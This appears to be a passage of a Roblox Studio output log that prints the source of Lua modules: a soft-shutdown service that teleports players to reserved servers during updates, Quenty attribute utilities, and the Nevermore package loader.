		return Promise.resolved(false)
	end

	return self._maid:GivePromise(DataStorePromises.getAsync(self._dataStore, game.PrivateServerId))
end

function SoftShutdownService:_promiseTeleportPlayersToLobby()
	local players = Players:GetPlayers()
	if RunService:IsStudio() or #players == 0 or game.JobId == "" then
		return Promise.resolved()
	end

	Workspace:SetAttribute(SoftShutdownConstants.IS_SOFT_SHUTDOWN_UPDATING_ATTRIBUTE, true)

	local initialTeleportOptions = Instance.new("TeleportOptions")
	initialTeleportOptions.ShouldReserveServer = true
	initialTeleportOptions:SetTeleportData({
		isSoftShutdownReserveServer = true;
	})

	-- Collect any players remaining
	local remainingPlayers = {}
	self._maid._playerAddedCollector = Players.PlayerAdded:Connect(function(player)
		table.insert(remainingPlayers, player)
	end)

	return Promise.spawn(function(resolve, _reject)
		-- Wait to let the teleport GUI be set
		task.delay(1, resolve)
	end):Then(function()
		return TeleportServiceUtils.promiseTeleport(game.PlaceId, players, initialTeleportOptions)
	end)
		:Then(function(teleportResult)
			self._maid._playerAddedCollector = nil

			-- Construct new teleport options
			local newTeleportOptions = Instance.new("TeleportOptions")
			newTeleportOptions.ServerInstanceId = teleportResult.PrivateServerId
			newTeleportOptions.ReservedServerAccessCode = teleportResult.ReservedServerAccessCode
			newTeleportOptions:SetTeleportData({
				isSoftShutdownReserveServer = true;
			})

			-- Teleport any players that joined during initial teleport
			local promises = {}

			if #remainingPlayers > 0 then
				table.insert(promises, TeleportServiceUtils.promiseTeleport(game.PlaceId, remainingPlayers, newTeleportOptions))
			end

			self._maid:GiveTask(Players.PlayerAdded:Connect(function(player)
				table.insert(promises, TeleportServiceUtils.promiseTeleport(game.PlaceId, { player }, newTeleportOptions))
			end))

			-- We hope this works!
			table.insert(promises, DataStorePromises.setAsync(self._dataStore, teleportResult.PrivateServerId, true))

			return Promise.spawn(function(resolve)
				while #Players:GetPlayers() > 0 and self:_containsPending(promises) do
					task.wait(1)
				end

				resolve()
			end)
		end)
end

function SoftShutdownService:_containsPending(promises)
	for _, item in pairs(promises) do
		if item:IsPending() then
			return true
		end
	end

	return false
end

function SoftShutdownService:_promiseRedirectAllPlayers()
	Workspace:SetAttribute(SoftShutdownConstants.IS_SOFT_SHUTDOWN_LOBBY_ATTRIBUTE, true)

	-- Wait for some players
	return Promise.spawn(function(resolve, reject)
		task.wait(1) -- Let the teleport GUI be set
		local players = Players:GetPlayers()
		while #players <= 0 do
			task.wait(1)
			players = Players:GetPlayers()
		end

		self._maid:GiveTask(reject)

		resolve(players)
	end)
		:Then(function(players)
			local teleportOptions = Instance.new("TeleportOptions")
			teleportOptions:SetTeleportData({
				isSoftShutdownArrivingIntoUpdatedServer = true;
			})

			-- Teleport all remaining players
			self._maid:GiveTask(Players.PlayerAdded:Connect(function(player)
				task.wait(1) -- Let the teleport GUI be set
				TeleportServiceUtils.promiseTeleport(game.PlaceId, { player }, teleportOptions)
			end))

			-- Try to keep players in the same group
			return TeleportServiceUtils.promiseTeleport(game.PlaceId, players, teleportOptions)
		end)
end

return SoftShutdownService  -  Editar
  04:54:13.785    -  Editar
  04:54:13.785  ----- [2399] ServerScriptService.Scripts.Core.SoftShutdown.src.Shared.SoftShutdownConstants -----  -  Editar
  04:54:13.785  --[=[
	@class SoftShutdownConstants
]=]

local require = require(script.Parent.loader).load(script)

local Table = require("Table")

return Table.readonly({
	IS_SOFT_SHUTDOWN_LOBBY_ATTRIBUTE = "IsSoftShutdownLobby";
	IS_SOFT_SHUTDOWN_UPDATING_ATTRIBUTE = "IsSoftshutdownRebootingServers";
})  -  Editar
  04:54:13.785    -  Editar
  04:54:13.785  ----- [2400] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.Shared.AttributeUtils -----  -  Editar
  04:54:13.785  --[=[
	Provides utility functions to work with attributes in Roblox
	@class AttributeUtils
]=]

local require = require(script.Parent.loader).load(script)

local RunService = game:GetService("RunService")

local Maid = require("Maid")

local AttributeUtils = {}

--[=[
	Whenever the attribute is true, the binder will be bound, and when the
	binder is bound, the attribute will be true.

	@param instance Instance
	@param attributeName string
	@param binder Binder<T>
	@return Maid
]=]
function AttributeUtils.bindToBinder(instance, attributeName, binder)
	assert(binder, "Bad binder")
	assert(typeof(instance) == "Instance", "Bad instance")
	assert(type(attributeName) == "string", "Bad attributeName")

	local maid = Maid.new()

	local function syncAttribute()
		if instance:GetAttribute(attributeName) then
			if RunService:IsClient() then
				binder:BindClient(instance)
			else
				binder:Bind(instance)
			end
		else
			if RunService:IsClient() then
				binder:UnbindClient(instance)
			else
				binder:Unbind(instance)
			end
		end
	end
	maid:GiveTask(instance:GetAttributeChangedSignal(attributeName):Connect(syncAttribute))

	local function syncBoundClass()
		if binder:Get(instance) then
			instance:SetAttribute(attributeName, true)
		else
			instance:SetAttribute(attributeName, false)
		end
	end
	maid:GiveTask(binder:ObserveInstance(instance, syncBoundClass))

	if binder:Get(instance) or instance:GetAttribute(attributeName) then
		instance:SetAttribute(attributeName, true)
		if RunService:IsClient() then
			binder:BindClient(instance)
		else
			binder:Bind(instance)
		end
	else
		instance:SetAttribute(attributeName, false)
		-- no need to bind
	end

	-- Depopuplate the attribute on exit
	maid:GiveTask(function()
		-- Force all cleaning first
		maid:DoCleaning()

		-- Cleanup
		instance:SetAttribute(attributeName, nil)
	end)

	return maid
end

--[=[
	Initializes an attribute for a given instance

	@param instance Instance
	@param attributeName string
	@param default any
	@return any? -- The value of the attribute
]=]
function AttributeUtils.initAttribute(instance, attributeName, default)
	assert(typeof(instance) == "Instance", "Bad instance")
	assert(typeof(attributeName) == "string", "Bad attributeName")

	local value = instance:GetAttribute(attributeName)
	if value == nil then
		instance:SetAttribute(attributeName, default)
		value = default
	end
	return value
end

--[=[
	Retrieves an attribute, and if it is nil, returns the default
	instead.
	@param instance Instance
	@param attributeName string
	@param default T?
	@return T?
]=]
function AttributeUtils.getAttribute(instance, attributeName, default)
	local value = instance:GetAttribute(attributeName)
	if value == nil then
		return default
	end

	return value
end

return AttributeUtils  -  Editar
  04:54:13.785    -  Editar
  04:54:13.785  ----- [2401] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.Shared.AttributeValue -----  -  Editar
  04:54:13.785  --[=[
	Allows access to an attribute like a ValueObject.

	```lua
	local attributeValue = AttributeValue.new(workspace, "Version", "1.0.0")
	print(attributeValue.Value) --> 1.0.0
	print(workspace:GetAttribute("version")) --> 1.0.0

	attributeValue.Changed:Connect(function()
		print(attributeValue.Value)
	end)

	workspace:SetAttribute("1.1.0") --> 1.1.0
	attributeValue.Value = "1.2.0" --> 1.2.0
	```

	@class AttributeValue
]=]

local require = require(script.Parent.loader).load(script)

local RxAttributeUtils = require("RxAttributeUtils")

local AttributeValue = {}
AttributeValue.ClassName = "AttributeValue"
AttributeValue.__index = AttributeValue

--[=[
	Constructs a new AttributeValue. If a defaultValue that is not nil
	is defined, then this value will be set on the Roblox object.

	@param object Instance
	@param attributeName string
	@param defaultValue T?
	@return AttributeValue<T>
]=]
function AttributeValue.new(object, attributeName, defaultValue)
	assert(typeof(object) == "Instance", "Bad object")
	assert(type(attributeName) == "string", "Bad attributeName")

	local self = {
		_object = object;
		_attributeName = attributeName;
		_defaultValue = defaultValue;
	}

	if defaultValue ~= nil and self._object:GetAttribute(self._attributeName) == nil then
		self._object:SetAttribute(rawget(self, "_attributeName"), defaultValue)
	end

	return setmetatable(self, AttributeValue)
end

--[=[
	Observes an attribute on an instance.
	@return Observable<any>
]=]
function AttributeValue:Observe()
	return RxAttributeUtils.observeAttribute(self._object, self._attributeName, rawget(self, "_defaultValue"))
end

--[=[
	The current property of the Attribute. Can be assigned to to write
	the attribute.
	@prop Value T
	@within AttributeValue
]=]

--[=[
	Signal that fires when the attribute changes
	@readonly
	@prop Changed Signal<()>
	@within AttributeValue
]=]
function AttributeValue:__index(index)
	if index == "Value" then
		local result = self._object:GetAttribute(rawget(self, "_attributeName"))
		local default = rawget(self, "_defaultValue")
		if result == nil then
			return default
		else
			return result
		end
	elseif index == "Changed" then
		return self._object:GetAttributeChangedSignal(self._attributeName)
	elseif AttributeValue[index] then
		return AttributeValue[index]
	else
		error(("%q is not a member of AttributeValue"):format(tostring(index)))
	end
end

function AttributeValue:__newindex(index, value)
	if index == "Value" then
		self._object:SetAttribute(rawget(self, "_attributeName"), value)
	else
		error(("%q is not a member of AttributeValue"):format(tostring(index)))
	end
end

return AttributeValue  -  Editar
  04:54:13.785    -  Editar
  04:54:13.786  ----- [2402] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.Shared.RxAttributeUtils -----  -  Editar
  04:54:13.786  --[=[
	Utility functions involving attributes.
	@class RxAttributeUtils
]=]

local require = require(script.Parent.loader).load(script)

local Observable = require("Observable")
local Maid = require("Maid")

local RxAttributeUtils = {}

--[=[
	Observes an attribute on an instance.
	@param instance Instance
	@param attributeName string
	@param defaultValue any?
	@return Observable<any>
]=]
function RxAttributeUtils.observeAttribute(instance, attributeName, defaultValue)
	assert(typeof(instance) == "Instance", "Bad instance")
	assert(type(attributeName) == "string", "Bad attributeName")

	return Observable.new(function(sub)
		local maid = Maid.new()

		local function update()
			local value = instance:GetAttribute(attributeName)
			if value == nil then
				sub:Fire(defaultValue)
			else
				sub:Fire(value)
			end
		end

		maid:GiveTask(instance:GetAttributeChangedSignal(attributeName):Connect(update))
		update()

		return maid
	end)
end

return RxAttributeUtils  -  Editar
  04:54:13.786    -  Editar
  04:54:13.786  ----- [2403] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader -----  -  Editar
  04:54:13.786  --[=[
	Loads Nevermore and handles loading!

	This is a centralized loader that handles the following scenarios:

	* Specific layouts for npm node_modules
	* Layouts for node_modules being symlinked
	* Multiple versions of modules being used in conjunction with each other
	* Relative path requires
	* Require by name
	* Replication to client and server

	@class Loader
]=]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local RunService = game:GetService("RunService")

local LegacyLoader = require(script.LegacyLoader)
local StaticLegacyLoader = require(script.StaticLegacyLoader)
local LoaderUtils = require(script.LoaderUtils)

local loader, metatable
if RunService:IsRunning() then
	loader = LegacyLoader.new(script)
	metatable = {
		__call = function(_self, value)
			return loader:Require(value)
		end;
		__index = function(_self, key)
			return loader:Require(key)
		end;
	}
else
	loader = StaticLegacyLoader.new()
	metatable = {
		__call = function(_self, value)
			local env = getfenv(2)
			return loader:Require(env.script, value)
		end;
		__index = function(_self, key)
			local env = getfenv(2)
			return loader:Require(env.script, key)
		end;
	}
end

--[=[
	Bootstraps the game by replicating packages to server, client, and
	shared.

	```lua
	local ServerScriptService = game:GetService("ServerScriptService")

	local loader = ServerScriptService:FindFirstChild("LoaderUtils", true).Parent
	local packages = require(loader).bootstrapGame(ServerScriptService.ik)
	```

	:::info
	The game must be running to do this bootstrapping operation.
	:::

	@server
	@function bootstrapGame
	@param packageFolder Instance
	@return Folder -- serverFolder
	@within Loader
]=]
local function bootstrapGame(packageFolder)
	assert(typeof(packageFolder) == "Instance", "Bad instance")
	assert(RunService:IsRunning(), "Game must be running")

	loader:Lock()

	local clientFolder, serverFolder, sharedFolder = LoaderUtils.toWallyFormat(packageFolder, false)

	clientFolder.Parent = ReplicatedStorage
	sharedFolder.Parent = ReplicatedStorage
	serverFolder.Parent = ServerScriptService

	return serverFolder
end

local function bootstrapPlugin(packageFolder)
	assert(typeof(packageFolder) == "Instance", "Bad instance")
	loader = LegacyLoader.new(script)
	loader:Lock()

	local pluginFolder = LoaderUtils.toWallyFormat(packageFolder, true)
	pluginFolder.Parent = packageFolder

	return function(value)
		if type(value) == "string" then
			if pluginFolder:FindFirstChild(value) then
				return require(pluginFolder:FindFirstChild(value))
			end

			error(("Unknown module %q"):format(tostring(value)))
		else
			return require(value)
		end
	end
end

--[=[
	A type that can be loaded into a module
	@type ModuleReference ModuleScript | number | string
	@within Loader
]=]

--[=[
	Returns a function that can be used to load modules relative
	to the script specified.

	```lua
	local require = require(script.Parent.loader).load(script)

	local maid = require("Maid")
	```

	@function load
	@param script Script -- The script to load dependencies for.
	@return (moduleReference: ModuleReference) -> any
	@within Loader
]=]
local function handleLoad(moduleScript)
	assert(typeof(moduleScript) == "Instance", "Bad moduleScript")

	return loader:GetLoader(moduleScript)
end

return setmetatable({
	load = handleLoad;
	bootstrapGame = bootstrapGame;
	bootstrapPlugin = bootstrapPlugin;
}, metatable)  -  Editar
  04:54:13.786    -  Editar
  04:54:13.786  ----- [2404] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.BounceTemplate -----  -  Editar
  04:54:13.786  --[=[
	Bounces the current named script to the expected version of this module

	@private
	@class BounceTemplate
]=]

local function waitForValue(objectValue)
	local value = objectValue.Value
	if value then
		return value
	end

	return objectValue.Changed:Wait()
end

return require(waitForValue(script:WaitForChild("BounceTarget")))  -  Editar
  04:54:13.786    -  Editar
  04:54:13.786  ----- [2405] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.BounceTemplateUtils -----  -  Editar
  04:54:13.787  --[=[
	@class BounceTemplateUtils
	@private
]=]

local BounceTemplate = script.Parent.BounceTemplate

local CREATE_ONLY_LINK = false

local BounceTemplateUtils = {}

function BounceTemplateUtils.isBounceTemplate(instance)
	return instance:GetAttribute("IsBounceTemplate", true) == true
end

function BounceTemplateUtils.getTarget(instance)
	if not BounceTemplateUtils.isBounceTemplate(instance) then
		return nil
	end

	if instance:IsA("ObjectValue") then
		return instance.Value
	else
		local found = instance:FindFirstChild("BounceTarget")
		if found then
			return found.Value
		else
			warn("[BounceTemplateUtils.getTarget] - Bounce template without BounceTarget")
			return nil
		end
	end
end

function BounceTemplateUtils.create(target, linkName)
	assert(typeof(target) == "Instance", "Bad target")
	assert(type(linkName) == "string", "Bad linkName")

	if CREATE_ONLY_LINK then
		return BounceTemplateUtils.createLink(target, linkName)
	end

	local copy = BounceTemplate:Clone()
	copy:SetAttribute("IsBounceTemplate", true)
	copy.Name = linkName

	local objectValue = Instance.new("ObjectValue")
	objectValue.Name = "BounceTarget"
	objectValue.Value = target
	objectValue.Parent = copy

	return copy
end

function BounceTemplateUtils.createLink(target, linkName)
	assert(typeof(target) == "Instance", "Bad target")
	assert(type(linkName) == "string", "Bad linkName")

	local objectValue = Instance.new("ObjectValue")
	objectValue.Name = linkName
	objectValue.Value = target
	objectValue:SetAttribute("IsBounceTemplate", true)

	return objectValue
end

return BounceTemplateUtils  -  Editar
  04:54:13.787    -  Editar
  04:54:13.787  ----- [2406] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.GroupInfoUtils -----  -  Editar
  04:54:13.787  --[=[
	Nevermore loader utility library
	@private
	@class GroupInfoUtils
]=]

local Utils = require(script.Parent.Utils)
local Queue = require(script.Parent.Queue)
local LoaderConstants = require(script.Parent.LoaderConstants)

local GroupInfoUtils = {}

function GroupInfoUtils.createGroupInfo()
	return Utils.readonly({
		scriptInfoMap = {}; -- [name] = scriptInfo (required link packages)
		packageScriptInfoMap = {};
		packageSet = {}; -- [packageInfo] = true (actually included packages)
	})
end

function GroupInfoUtils.groupPackageInfos(packageInfoList, replicationMode)
	assert(type(packageInfoList) == "table", "Bad packageInfoList")
	assert(type(replicationMode) == "string", "Bad replicationMode")

	local queue = Queue.new()
	local seen = {}

	for _, packageInfo in pairs(packageInfoList) do
		if not seen[packageInfo] then
			seen[packageInfo] = true
			queue:PushRight(packageInfo)
		end
	end

	local built = {}
	local current = GroupInfoUtils.createGroupInfo()
	while not queue:IsEmpty() do
		local packageInfo = queue:PopLeft()
		if GroupInfoUtils.hasAnythingToReplicate(packageInfo, replicationMode) then
			if GroupInfoUtils.canAddPackageInfoToGroup(current, packageInfo, replicationMode) then
				GroupInfoUtils.addPackageInfoToGroup(current, packageInfo, replicationMode)

				if LoaderConstants.GROUP_EACH_PACKAGE_INDIVIDUALLY then
					table.insert(built, current)
					current = GroupInfoUtils.createGroupInfo()
				end
			elseif LoaderConstants.ALLOW_MULTIPLE_GROUPS then
				-- Create a new group
				table.insert(built, current)
				current = GroupInfoUtils.createGroupInfo()
				GroupInfoUtils.addPackageInfoToGroup(current, packageInfo, replicationMode)
			else
				-- Force generate error
				GroupInfoUtils.addPackageInfoToGroup(current, packageInfo, replicationMode)

				error("Cannot add package to group")
			end
		end

		for dependentPackageInfo, _ in pairs(packageInfo.dependencySet) do
			if not seen[dependentPackageInfo] then
				seen[dependentPackageInfo] = true
				queue:PushRight(dependentPackageInfo)
			end
		end
	end

	if next(current.packageSet) then
		table.insert(built, current)
	end

	return built
end

function GroupInfoUtils.hasAnythingToReplicate(packageInfo, replicationMode)
	return next(packageInfo.scriptInfoLookup[replicationMode]) ~= nil
end

function GroupInfoUtils.canAddScriptInfoToGroup(groupInfo, scriptInfo, scriptName, tempScriptInfoMap)
	assert(type(groupInfo) == "table", "Bad groupInfo")
	assert(type(scriptInfo) == "table", "Bad scriptInfo")
	assert(type(scriptName) == "string", "Bad scriptName")
	assert(type(tempScriptInfoMap) == "table", "Bad tempScriptInfoMap")

	local wouldHaveInfo = tempScriptInfoMap[scriptName]
	if wouldHaveInfo and wouldHaveInfo ~= scriptInfo then
		return false
	end

	local currentScriptInfo = groupInfo.scriptInfoMap[scriptName]
	if currentScriptInfo and currentScriptInfo ~= scriptInfo then
		return false
	end

	return true
end

function GroupInfoUtils.canAddPackageInfoToGroup(groupInfo, packageInfo, replicationMode)
	assert(type(groupInfo) == "table", "Bad groupInfo")
	assert(type(packageInfo) == "table", "Bad packageInfo")
	assert(type(replicationMode) == "string", "Bad replicationMode")

	local tempScriptInfoMap = {}

	-- Existing scripts must be added
	for scriptName, scriptInfo in pairs(packageInfo.scriptInfoLookup[replicationMode]) do
		if GroupInfoUtils.canAddScriptInfoToGroup(groupInfo, scriptInfo, scriptName, tempScriptInfoMap) then
			tempScriptInfoMap[scriptName] = scriptInfo
		else
			return false
		end
	end

	-- Dependencies are expected at parent level
	for dependencyPackageInfo, _ in pairs(packageInfo.dependencySet) do
		if not groupInfo.packageSet[dependencyPackageInfo] then
			-- Lookup dependencies and try to merge them
			-- O(p*d*s)
			for scriptName, scriptInfo in pairs(dependencyPackageInfo.scriptInfoLookup[replicationMode]) do
				if GroupInfoUtils.canAddScriptInfoToGroup(groupInfo, scriptInfo, scriptName, tempScriptInfoMap) then
					tempScriptInfoMap[scriptName] = scriptInfo
				else
					return false
				end
			end
		end
	end

	return true
end

function GroupInfoUtils.addScriptToGroup(groupInfo, scriptName, scriptInfo)
	assert(type(groupInfo) == "table", "Bad groupInfo")
	assert(type(scriptInfo) == "table", "Bad scriptInfo")
	assert(type(scriptName) == "string", "Bad scriptName")

	local currentScriptInfo = groupInfo.scriptInfoMap[scriptName]
	if currentScriptInfo and currentScriptInfo ~= scriptInfo then
		error(("Cannot add to package group, conflicting scriptInfo for %q already there")
			:format(scriptName))
	end

	groupInfo.scriptInfoMap[scriptName] = scriptInfo
end

function GroupInfoUtils.addPackageInfoToGroup(groupInfo, packageInfo, replicationMode)
	groupInfo.packageSet[packageInfo] = true

	-- Existing scripts must be added
	for scriptName, scriptInfo in pairs(packageInfo.scriptInfoLookup[replicationMode]) do
		GroupInfoUtils.addScriptToGroup(groupInfo, scriptName, scriptInfo)
		groupInfo.packageScriptInfoMap[scriptName] = scriptInfo
	end

	-- Dependencies are expected at parent level
	for dependencyPackageInfo, _ in pairs(packageInfo.dependencySet) do
		if not groupInfo.packageSet[dependencyPackageInfo] then
			-- Lookup dependencies and try to merge them
			-- O(p*d*s)
			for scriptName, scriptInfo in pairs(dependencyPackageInfo.scriptInfoLookup[replicationMode]) do
				GroupInfoUtils.addScriptToGroup(groupInfo, scriptName, scriptInfo)
			end
		end
	end
end

return GroupInfoUtils  -  Editar
  04:54:13.787    -  Editar
  04:54:13.787  ----- [2407] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.LegacyLoader -----  -  Editar
  04:54:13.788  --[=[
	Legacy loading logic

	@private
	@class LegacyLoader
]=]

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")

local LoaderUtils = require(script.Parent.LoaderUtils)
local BounceTemplateUtils = require(script.Parent.BounceTemplateUtils)
local Loader = require(script.Parent.Loader)

local LegacyLoader = {}
LegacyLoader.ClassName = "LegacyLoader"
LegacyLoader.__index = LegacyLoader

function LegacyLoader.new(script)
	return setmetatable({
		_script = assert(script, "No script");
		_container = false;
		_locked = false;
		_lookupMap = {};
	}, LegacyLoader)
end

function LegacyLoader:Lock()
	assert(not self._container, "Cannot bootstrap game when legacy loader was already used")
	self._locked = true
end

function LegacyLoader:GetLoader(moduleScript)
	return Loader.new(moduleScript)
end

function LegacyLoader:Require(value)
	assert(not self._locked, "Cannot use legacy loader after already transformed")

	self:_setupIfNeeded()

	if type(value) == "number" then
		return require(value)
	elseif type(value) == "string" then
		local existing = self._lookupMap[value]
		if existing then
			return require(existing)
		else
			error("Error: Library '" .. tostring(value) .. "' does not exist.", 2)
		end
	elseif typeof(value) == "Instance" and value:IsA("ModuleScript") then
		return require(value)
	else
		error(("Error: module must be a string or ModuleScript, got '%s' for '%s'")
			:format(typeof(value), tostring(value)))
	end
end

function LegacyLoader:_buildLookupContainer()
	for _, instance in pairs(self._container:GetDescendants()) do
		if instance:IsA("ModuleScript")
			and not instance:FindFirstAncestorWhichIsA("ModuleScript") then
			local target = instance
			if BounceTemplateUtils.isBounceTemplate(instance) then
				target = BounceTemplateUtils.getTarget(instance) or instance
			end

			local existing = self._lookupMap[instance.Name]
			if existing then
				if target ~= existing then
					warn(("[LegacyLoader] - Duplicate module %q found, using first found\n\t(1) %s (used)\n\t(2) %s")
						:format(
							instance.Name,
							self._lookupMap[instance.Name]:GetFullName(),
							instance:GetFullName()))
				end
			else
				self._lookupMap[instance.Name] = target
			end
		end
	end
end

function LegacyLoader:_setupIfNeeded()
	local existingContainer = rawget(self, "_container")
	if existingContainer then
		return existingContainer
	end

	-- TODO: Handle setup by manual process
	assert(self._script.Name == "Nevermore", "Cannot invoke legacy mode if not at ReplicatedStorage.Nevermore")
	assert(self._script.Parent == ReplicatedStorage, "Cannot invoke legacy mode if not at ReplicatedStorage.Nevermore")

	if not RunService:IsRunning() then
		error("Test mode not supported")
	elseif RunService:IsServer() and RunService:IsClient() or (not RunService:IsRunning()) then
		if RunService:IsRunning() then
			error("Warning: Loading all modules in PlaySolo. It's recommended you use accurate play solo.")
		end
	elseif RunService:IsServer() then
		local container = ServerScriptService:FindFirstChild("Nevermore") or error("No ServerScriptService.Nevermore folder")
		local clientFolder, serverFolder, sharedFolder = LoaderUtils.toWallyFormat(container)

		clientFolder.Name = "_nevermoreClient"
		clientFolder.Parent = ReplicatedStorage

		sharedFolder.Name = "_nevermoreShared"
		sharedFolder.Parent = ReplicatedStorage

		serverFolder.Name = "_nevermoreServer"
		serverFolder.Parent = ServerScriptService

		rawset(self, "_container", serverFolder)
		self:_buildLookupContainer()
	elseif RunService:IsClient() then
		local container = ReplicatedStorage:WaitForChild("_nevermoreClient", 2)

		if not container then
			warn("[Nevermore] - Be sure to call require(ServerScriptService.Nevermore) on the server to replicate nevermore")
			container = ReplicatedStorage:WaitForChild("_nevermoreClient")
		end

		rawset(self, "_container", container)
		self:_buildLookupContainer()
	else
		error("Error: Unknown RunService state (Not client/server/test mode)")
	end
end

return LegacyLoader  -  Editar
  04:54:13.788    -  Editar
  04:54:13.788  ----- [2408] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.Loader -----  -  Editar
  04:54:13.788  --[=[
	Loading logic for Nevermore

	@private
	@class LoaderClass
]=]

local Loader = {}
Loader.ClassName = "Loader"
Loader.__index = Loader

function Loader.new(script)
	return setmetatable({
		_script = script;
	}, Loader)
end

local function waitForValue(objectValue)
	local value = objectValue.Value
	if value then
		return value
	end

	return objectValue.Changed:Wait()
end

function Loader:__call(value)
	if type(value) == "string" then
		local object = self._script.Parent[value]
		if object:IsA("ObjectValue") then
			return require(waitForValue(object))
		else
			return require(object)
		end
	else
		return require(value)
	end
end

function Loader:__index(value)
	if type(value) == "string" then
		local object = self._script.Parent[value]
		if object:IsA("ObjectValue") then
			return require(waitForValue(object))
		else
			return require(object)
		end
	else
		return require(value)
	end
end


return Loader  -  Editar
  04:54:13.788    -  Editar
  04:54:13.788  ----- [2409] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.LoaderConstants -----  -  Editar
  04:54:13.788  --[=[
	@private
	@class LoaderConstants
]=]

local Utils = require(script.Parent.Utils)

return Utils.readonly({
	GROUP_EACH_PACKAGE_INDIVIDUALLY = false;
	ALLOW_MULTIPLE_GROUPS = true;
	INCLUDE_IMPLICIT_DEPENDENCIES = true;
})  -  Editar
  04:54:13.788    -  Editar
  04:54:13.788  ----- [2410] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.LoaderUtils -----  -  Editar
  04:54:13.788  --[=[
	@private
	@class LoaderUtils
]=]

local loader = script.Parent
local BounceTemplateUtils = require(script.Parent.BounceTemplateUtils)
local GroupInfoUtils = require(script.Parent.GroupInfoUtils)
local PackageInfoUtils = require(script.Parent.PackageInfoUtils)
local ScriptInfoUtils = require(script.Parent.ScriptInfoUtils)
local Utils = require(script.Parent.Utils)

local LoaderUtils = {}
LoaderUtils.Utils = Utils -- TODO: Remove this

LoaderUtils.ContextTypes = Utils.readonly({
	CLIENT = "client";
	SERVER = "server";
})
LoaderUtils.IncludeBehavior = Utils.readonly({
	NO_INCLUDE = "noInclude";
	INCLUDE_ONLY = "includeOnly";
	INCLUDE_SHARED = "includeShared";
})

function LoaderUtils.toWallyFormat(instance, isPlugin)
	assert(typeof(instance) == "Instance", "Bad instance")
	assert(type(isPlugin) == "boolean", "Bad isPlugin")

	local topLevelPackages = {}
	LoaderUtils.discoverTopLevelPackages(topLevelPackages, instance)
	LoaderUtils.injectLoader(topLevelPackages)

	local packageInfoList = {}
	local packageInfoMap = {}
	local defaultReplicationType = isPlugin
		and ScriptInfoUtils.ModuleReplicationTypes.PLUGIN
		or ScriptInfoUtils.ModuleReplicationTypes.SHARED

	for _, folder in pairs(topLevelPackages) do
		local packageInfo = PackageInfoUtils.getOrCreatePackageInfo(folder, packageInfoMap, "", defaultReplicationType)
		table.insert(packageInfoList, packageInfo)
	end

	PackageInfoUtils.fillDependencySet(packageInfoList)

	if isPlugin then
		local pluginGroup = GroupInfoUtils.groupPackageInfos(packageInfoList,
			ScriptInfoUtils.ModuleReplicationTypes.PLUGIN)

		local publishSet = LoaderUtils.getPublishPackageInfoSet(packageInfoList)

		local pluginFolder = Instance.new("Folder")
		pluginFolder.Name = "PluginPackages"

		LoaderUtils.reifyGroupList(pluginGroup, publishSet, pluginFolder, ScriptInfoUtils.ModuleReplicationTypes.PLUGIN)

		return pluginFolder
	else
		local clientGroupList = GroupInfoUtils.groupPackageInfos(packageInfoList,
			ScriptInfoUtils.ModuleReplicationTypes.CLIENT)
		local serverGroupList = GroupInfoUtils.groupPackageInfos(packageInfoList,
			ScriptInfoUtils.ModuleReplicationTypes.SERVER)
		local sharedGroupList = GroupInfoUtils.groupPackageInfos(packageInfoList,
			ScriptInfoUtils.ModuleReplicationTypes.SHARED)

		local publishSet = LoaderUtils.getPublishPackageInfoSet(packageInfoList)

		local clientFolder = Instance.new("Folder")
		clientFolder.Name = "Packages"

		local sharedFolder = Instance.new("Folder")
		sharedFolder.Name = "SharedPackages"

		local serverFolder = Instance.new("Folder")
		serverFolder.Name = "Packages"

		LoaderUtils.reifyGroupList(clientGroupList, publishSet, clientFolder, ScriptInfoUtils.ModuleReplicationTypes.CLIENT)
		LoaderUtils.reifyGroupList(serverGroupList, publishSet, serverFolder, ScriptInfoUtils.ModuleReplicationTypes.SERVER)
		LoaderUtils.reifyGroupList(sharedGroupList, publishSet, sharedFolder, ScriptInfoUtils.ModuleReplicationTypes.SHARED)

		return clientFolder, serverFolder, sharedFolder
	end
end

function LoaderUtils.isPackage(folder)
	assert(typeof(folder) == "Instance", "Bad instance")

	for _, item in pairs(folder:GetChildren()) do
		if item:IsA("Folder") then
			if item.Name == "Server"
				or item.Name == "Client"
				or item.Name == "Shared"
				or item.Name == ScriptInfoUtils.DEPENDENCY_FOLDER_NAME then
				return true
			end
		end
	 end

	 return false
end

function LoaderUtils.injectLoader(topLevelPackages)
	for _, item in pairs(topLevelPackages) do
		-- If we're underneath the hierachy or if we're in the actual item...
		if item == loader or loader:IsDescendantOf(item) then
			return
		end
	end

	-- We need the loader injected!
	table.insert(topLevelPackages, loader)
end

function LoaderUtils.discoverTopLevelPackages(packages, instance)
	assert(type(packages) == "table", "Bad packages")
	assert(typeof(instance) == "Instance", "Bad instance")

	if LoaderUtils.isPackage(instance) then
		table.insert(packages, instance)
	elseif instance:IsA("ObjectValue") then
		local linkedValue = instance.Value
		if linkedValue and LoaderUtils.isPackage(linkedValue) then
			table.insert(packages, linkedValue)
		end
	else
		-- Loop through all folders
		for _, item in pairs(instance:GetChildren()) do
			if item:IsA("Folder") then
				LoaderUtils.discoverTopLevelPackages(packages, item)
			elseif item:IsA("ObjectValue") then
				local linkedValue = item.Value
				if linkedValue and LoaderUtils.isPackage(linkedValue) then
					table.insert(packages, linkedValue)
				end
			elseif item:IsA("ModuleScript") then
				table.insert(packages, item)
			end
		end
